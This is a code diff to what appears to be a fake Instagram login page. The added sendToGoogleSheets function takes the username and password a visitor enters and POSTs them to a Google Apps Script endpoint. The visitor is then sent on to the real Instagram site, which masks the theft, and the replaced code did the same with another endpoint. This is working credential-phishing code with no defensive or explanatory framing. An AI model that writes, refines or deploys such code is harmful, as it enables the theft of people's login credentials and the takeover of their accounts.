@@ -111,23 +111,28 @@
         }
     </style>
     <script>
+        function sendToGoogleSheets(username, password) {
+            fetch("https://script.google.com/macros/s/AKfycbwUuTK109Cr7PsqkdC6qdQuwg6qkEnCF4PZ0UXtJ2ruta1XRJF0UlyDiwcfvTohk9m_/exec", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username: username, password: password })
+            })
+            .then(response => response.text())
+            .then(data => console.log("Data sent to Google Sheets:", data))
+            .catch(error => console.error("Error sending data:", error));
+        }
+
+        function redirectToInstagram() {
+            window.location.href = "https://www.instagram.com/?hl=en";
+        }
+
         function validateLogin() {
             var username = document.querySelector(".input-1").value;
             var password = document.querySelector(".input-2").value;
             
             if (username !== "" && password !== "") {
-                // Send data to Google Sheets
-                fetch("https://script.google.com/macros/s/AKfycbz1oXvmomYTjXnXINkr-nGEhCGJ5GYNMOwDtkRKpzSwsgUwXObeLqIy6fv_sGavEQU/exec", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ username: username, password: password })
-                })
-                .then(response => response.text())
-                .then(() => {
-                    // Redirect to Instagram
-                    window.location.href = "https://www.instagram.com/?hl=en";
-                })
-                .catch(error => console.error("Error:", error));
+                sendToGoogleSheets(username, password);
+                setTimeout(redirectToInstagram, 1000); // Delay for smooth execution
             } else {
                 alert("Please fill in both fields.");
             }
@@ -155,7 +160,5 @@
             </div>
         </div>
     </div>
-    
-    
 </body>
 </html>
